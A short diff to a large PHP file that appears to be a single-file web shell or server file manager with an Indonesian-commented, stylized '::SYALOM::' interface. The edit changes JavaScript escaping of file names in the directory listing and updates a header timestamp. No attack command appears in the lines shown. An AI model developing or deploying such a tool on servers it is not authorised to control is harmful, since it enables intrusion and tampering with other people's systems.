@@ -2238,15 +2238,15 @@ function list_dir($path) {
             $linkClass .= ' not-writable-text';
         }
         // Jika file, klik masuk ke edit mode (atau view jika tidak writable)
+        $escapedF = htmlspecialchars($f, ENT_QUOTES);
+        $escapedF_js = addslashes($escapedF);
         if ($isDir) {
             $nameLink = "<a class='$linkClass' href='$urlBase&d=" . urlencode($full) . "'>$encoded</a>";
         } else {
             if ($isWritable) {
-                $escapedF = htmlspecialchars($f, ENT_QUOTES);
-                $nameLink = "<a class='$linkClass' href='javascript:void(0)' onclick='openEditModal(\\"$escapedF\\")'>$encoded</a>";
+                $nameLink = "<a class='$linkClass' href='javascript:void(0)' onclick='openEditModal(\"$escapedF_js\")'>$encoded</a>";
             } else {
-                $escapedF = htmlspecialchars($f, ENT_QUOTES);
-                $nameLink = "<a class='$linkClass' href='javascript:void(0)' onclick='viewFileAsync(\\"$escapedF\\")'>$encoded</a>";
+                $nameLink = "<a class='$linkClass' href='javascript:void(0)' onclick='viewFileAsync(\"$escapedF_js\")'>$encoded</a>";
             }
         }
         if ($isDir) {
@@ -2447,7 +2447,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 030426 2127</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 030426 2232</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
